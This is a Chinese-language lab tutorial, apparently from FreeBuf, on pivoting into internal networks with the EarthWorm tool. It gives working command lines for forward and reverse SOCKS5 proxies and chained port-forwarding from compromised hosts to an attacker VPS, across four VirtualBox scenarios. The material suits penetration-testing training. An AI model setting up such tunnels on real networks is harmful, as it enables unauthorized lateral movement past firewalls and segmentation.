**本文主要讲述使用ew软件（earthworm）实现socks
5代理功能，用于内网穿透。关于socks的相关概念，可以参考实验室的上一篇文章《内网渗透：使用reGeorg实现socks代理》。**

earthworm与reGeorg都可以实现socks代理功能，但是reGeorg的服务端是webshell，而earthworm的服务端和客户端使用相同的可执行文件。另外earthworm不需要跳板机运行web服务，并且它支持更加复杂的渗透任务。

下面通过在虚拟化平台的操作来说明ew的使用方法。

##  ****一、平台及工具版本 ****

虚拟化软件：virtualbox 6.1

虚拟系统：windows 7、metasploitable 2等

host系统：linux mint

硬件平台：笔记本电脑

## 二、操作步骤

（一）下载

earthworm site:download.csdn.com //github也可以下载。

![image.png](https://image.3001.net/images/20200418/1587207413_5e9adcf5c89c0.png!small)可以看到earthworm对windows、linux、mac平台都是支持的。

（二）使用 ****

 **场景1、攻击者连接跳板机，再访问目标机**

场景描述：攻击者（192.168.1.7）位于外网，无法访问目标网络内部的主机。但是攻击者可以访问目标网络中对外暴露的服务器（192.168.1.8），这台服务器拥有内网IP地址（192.168.56.113），可以访问内网机器。

攻击链路：攻击者以服务器（192.168.1.8）为跳板，攻击内网机器（192.168.56.101）。

通过virtualbox虚拟化软件实现场景搭建，网络模式和IP地址配置如下：

角色| 系统类型| IP地址| 网络类型  
---|---|---|---  
攻击者| linux（host）| 192.168.1.7| 主操作系统  
跳板机| kali（guest）| 192.168.1.8192.168.56.113| 桥接host-only  
目标机| metasploitable2（guest）| 192.168.56.101| host-only  
  
 ****（1）跳板机操作 ****

攻击者以某种手段控制了跳板机后，将ew_for_linux传到跳板机

mv ew_for_linux ew //文件改名

./ew -s ssocksd -l 8888 //在8888端口上开启socks代理，ssocksd提供正向代理功能

![image.png](https://image.3001.net/images/20200418/1587207519_5e9add5fd4439.png!small)

ew开始监听端口了。可以看到截图中当前用户是root，实际上监听1024以上的端口无需root权限，普通用户即可。攻击者连接到跳板机的8888端口之后，跳板机根据本机的路由表配置，将访问者的数据包从适当的网口转发出去。转发之后，包的源地址会被修改为这个出口的IP地址。

注意，在linux跳板机上转发数据包，内核的IP转发功能是需要开启的。

 ****（2）攻击者本地运行全局代理 ****

以proxychains为例，说明全局代理的用法：

apt install proxychains //安装proxychains

vi /etc/proxychains.conf //配置proxychains

将最后一行的socks4注释掉，添加下面的行，端口为跳板机上的ew监听的8888：

socks5 192.168.1.8 8888

保存退出

proxychains telnet 192.168.56.101 //通过socks代理访问目标机

![image.png](https://image.3001.net/images/20200418/1587207546_5e9add7a42b5d.png!small)登录成功。

（3）功能验证

在目标机抓包，可以看到访问者的地址是跳板机的地址（192.168.56.113），也就是说，socks代理的工作是正常的。

![image.png](https://image.3001.net/images/20200418/1587207566_5e9add8ef2468.png!small)

 **场景2、攻击者连接跳板机，内网跳板反弹连接到跳板机，内网跳板连接内网目标主机**

场景描述：攻击者（192.168.1.7）位于外网，无法访问目标网络内部的主机。但是攻击者可以访问目标网络中对外暴露的服务器（192.168.1.8）。在目标网络中还有一台机器是被控制的，IP地址10.0.2.15，这台机器可以反弹连接到跳板机。

攻击链路：攻击者首先连接到跳板机，再连接到内网跳板，最后访问内网的目标机器（192.168.1.9）。

由于virtualbox虚拟化环境的网络模拟能力有限，内网目标机器不使用网络地址转换（NAT）方式，而是使用桥接模式，只要内网跳板能访问到内网目标即可说明问题。

通过virtualbox虚拟化软件实现场景搭建，网络模式和IP地址配置如下：

角色| 系统类型| IP地址| 网络类型  
---|---|---|---  
攻击者| linux mint| 192.168.1.7| 主操作系统  
跳板机| kali| 192.168.1.8| 桥接  
内网跳板| windows 7| 10.0.2.15| NAT  
目标机| metasploitable2| 192.168.1.9| 桥接  
  
 ****（1）跳板机上的操作 ****

./ew -s rcsocks -l 1080 -e 8888 //添加转发隧道，将1080端口收到的代理请求转发给反连8888端口的主机

![image.png](https://image.3001.net/images/20200418/1587207655_5e9adde700ce3.png!small)

（2）内网跳板操作

.\ew -s rssocks -d 192.168.1.8 -e 8888 //内网跳板反弹连接到跳板机的8888端口

![image.png](https://image.3001.net/images/20200418/1587207666_5e9addf25dae1.png!small)

（3）攻击者本地运行全局代理

以proxychains为例，说明全局代理的用法：

apt install proxychains //安装proxychains

vi /etc/proxychains.conf //配置proxychains

将最后一行的socks4注释掉，添加下面的行，端口为VPS上的ew监听的1080（注意这里不再是8888）：

socks5 192.168.1.8 1080

保存退出

proxychains telnet 192.168.1.9 //通过socks代理访问内网目标主机

![image.png](https://image.3001.net/images/20200418/1587207690_5e9ade0ad810c.png!small)成功。

 **场景3、攻击者连接跳板机，跳板机连接到内网跳板，内网跳板连接内网目标主机**

场景描述：攻击者（192.168.1.7）位于外网，无法访问目标网络内部的主机。但是攻击者可以访问目标网络中对外暴露的服务器（192.168.1.8），该服务器有内网IP地址（192.168.56.113）。在目标网络中还有一台机器是被控制的，IP地址为192.168.56.107，跳板机可以发起到这台内网跳板的连接。

攻击链路：攻击者首先连接到跳板机，再连接到内网跳板，最后访问内网目标机器（192.168.56.101）。

可以看到，场景3与场景2的不同在于跳板机连接内网跳板的方式。在场景2中，内网跳板主动连接跳板机，场景3是跳板机主动连接内网跳板。

通过virtualbox虚拟化软件实现场景搭建，网络模式和IP地址配置如下：

角色| 系统类型| IP地址| 网络类型  
---|---|---|---  
攻击者| linux mint| 192.168.1.7| 主操作系统  
跳板机| kali| 192.168.1.8192.168.56.113| 桥接host-only  
内网跳板| windows 7| 192.168.56.107| host-only  
目标机| metasploitable2| 192.168.56.101| host-only  
  
（1）内网跳板操作

./ew -s ssocksd -l 8888 //利用ssocksd方式启动8888端口的socks代理

![image.png](https://image.3001.net/images/20200418/1587207739_5e9ade3bbfbf6.png!small)

（2）跳板机操作

./ew -s lcx_tran -l 1080 -f 192.168.56.107 -g 8888
//将本机1080端口收到的socks代理请求转交给内网跳板

![image.png](https://image.3001.net/images/20200418/1587207753_5e9ade493b833.png!small)

（3）攻击者操作

通过访问跳板机的1080端口来使用内网跳板提供的socks5代理。

以proxychains为例，说明全局代理的用法：

apt install proxychains //安装proxychains

vi /etc/proxychains.conf //配置proxychains

将最后一行的socks4注释掉，添加下面的行，端口为VPS上的ew监听的1080

socks5 192.168.1.8 1080

保存退出

proxychains telnet 192.168.56.101 //通过socks代理访问目标机C（192.168.56.102）

![image.png](https://image.3001.net/images/20200418/1587207794_5e9ade72275a5.png!small)成功。

 ****（4）功能验证 ****

在目标机上抓包，连接目标机telnet服务的源地址是内网跳板的IP地址，说明socks代理工作正常。

![image.png](https://image.3001.net/images/20200418/1587207811_5e9ade83789ae.png!small)

 **场景4、攻击者连接VPS，内网跳板A反弹连接VPS，A连接内网跳板B，B访问内网目标主机**

场景描述：攻击者有自己的电脑（192.168.1.7）和一台VPS（192.168.1.8），并且控制了目标网络中的两台主机。其中主机A（192.168.56.114）无公网IP，无法访问内网的目标机，但是可以连接公网。另一台主机B（192.168.56.107）可以访问目标机（192.168.56.101），但是无法连接公网。主机A和主机B之间路由可达。

攻击链路：攻击者连接VPS，内网跳板A反弹连接VPS，A连接内网跳板B，B访问内网目标主机。

（1）通过virtualbox虚拟化软件实现场景搭建，网络模式和IP地址配置如下：

角色| 系统类型| IP地址| 网络类型  
---|---|---|---  
攻击者| linux mint| 192.168.1.7| 主操作系统  
VPS| kali| 192.168.1.8| 桥接  
主机A| windows xp| 192.168.56.114| host-only  
主机B| windows 7| 192.168.56.107| host-only  
目标机| metasploitable2| 192.168.56.101| host-only  
  
（2）VPS上的操作：

./ew -s lcx_listen -l 1080 -e 8888 //创建转发隧道，将本地1080端口收到的代理请求转发给连接自己8888端口的主机

![image.png](https://image.3001.net/images/20200418/1587207853_5e9adead5d4f3.png!small)

（3）主机B上的操作：

ew -s ssocksd -l 9999 //以ssocksd方式启动9999端口的socks代理

![image.png](https://image.3001.net/images/20200418/1587207863_5e9adeb78217e.png!small)

（4）主机A上的操作：

route add 192.168.1.0 mask 255.255.255.0 192.168.56.1 //添加路由（突破host-only网络的限制）

ew -s lcx_slave -d 192.168.1.8 -e 8888 -f 192.168.56.107 -g 9999
//通过工具的lcx_slave方式，打通VPS的8888端口和主机B的9999端口之间的通讯隧道

![image.png](https://image.3001.net/images/20200418/1587207875_5e9adec3469cf.png!small)

（5）攻击者操作：

通过访问VPS的1080端口来使用主机B提供的socks5代理

以proxychains为例，说明全局代理的用法：

apt install proxychains //安装proxychains

vi /etc/proxychains.conf //配置proxychains

将最后一行的socks4注释掉，添加下面的行，端口为VPS上的ew监听的1080

socks5 192.168.1.8 1080

保存退出

proxychains telnet 192.168.56.101 //通过socks代理访问目标机C（192.168.56.102）

![image.png](https://image.3001.net/images/20200418/1587207890_5e9aded250176.png!small)

代理成功。

（6）功能验证

访问目标机telnet服务的源地址是192.168.56.107，也就是主机B。说明sockes代理工作正常。

![image.png](https://image.3001.net/images/20200418/1587207903_5e9adedf27f90.png!small)

## 三、总结

earthworm提供六种链路状态，可通过-s参数进行选定，分别为:

ssocksd、rcsocks、rssocks //提供socks代理功能

lcx_slave lcx_tran lcx_listen //提供端口转发功能

在实际的渗透工作中遇到的情况可能很复杂。一是高安全级别的网络一般会对三层设备的路由功能执行严格的控制，例如不配置默认路由，并且对于使用某个三层设备的部门，如果业务上不需要访问其它某个部门的网络，就不会在设备上添加去往那个部门网络的路由。二是内网中不同安全域之间存在防火墙的限制。这样通过一个socks代理就难以访问到整个网络了，这时候就会需要位于不同网段的节点进行配合，绕过各种限制，才能最大程度地实现“内网穿透”。

 ***本文作者：regitnew，转载请注明来自FreeBuf.COM** ****  

